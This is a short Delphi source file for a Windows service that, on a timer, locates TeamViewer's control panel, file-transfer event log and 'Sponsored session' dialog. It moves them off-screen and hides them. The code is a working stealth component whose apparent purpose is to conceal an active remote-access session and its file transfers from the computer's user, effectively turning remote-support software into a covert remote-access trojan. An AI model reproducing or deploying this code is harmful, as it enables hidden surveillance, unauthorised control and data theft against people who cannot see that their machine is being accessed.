unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, SvcMgr, Dialogs,
  Menus, ActnPopup, ExtCtrls;

type
  TTV5_CliActHide = class(TService)
    PopupMenu1: TPopupMenu;
    Find: TMenuItem;
    TrayIcon1: TTrayIcon;
    Timer1: TTimer;
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    function GetServiceController: TServiceController; override;
    { Public declarations }
  end;

var
  TV5_CliActHide: TTV5_CliActHide;


implementation

{$R *.DFM}

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  TV5_CliActHide.Controller(CtrlCode);
end;

function TTV5_CliActHide.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;  

procedure TTV5_CliActHide.Timer1Timer(Sender: TObject);
var tvcp, tvcpm, tvlog, tvadv: hwnd;
begin
tvcp:=FindWindow('TV_ServerControl',0);
tvcpm:=FindWindow('ATL:008DE158',0);
tvlog:=FindWindow('#32770','TeamViewer - File Transfer Eventlog');
tvadv:=FindWindow('#32770','Sponsored session');
SetWindowPos(tvcp,HWND_top,-1000,-1000,1,1,SWP_NOACTIVATE);
SetWindowPos(tvcpm,HWND_top,-1000,-1000,1,1,SWP_NOACTIVATE);
SetWindowPos(tvlog,HWND_top,-1000,-1000,1,1,SWP_NOACTIVATE);
SetWindowPos(tvadv,HWND_top,-1000,-1000,1,1,SWP_NOACTIVATE);
ShowWindow(tvlog,sw_hide);
ShowWindow(tvadv,sw_hide);
end;

end.
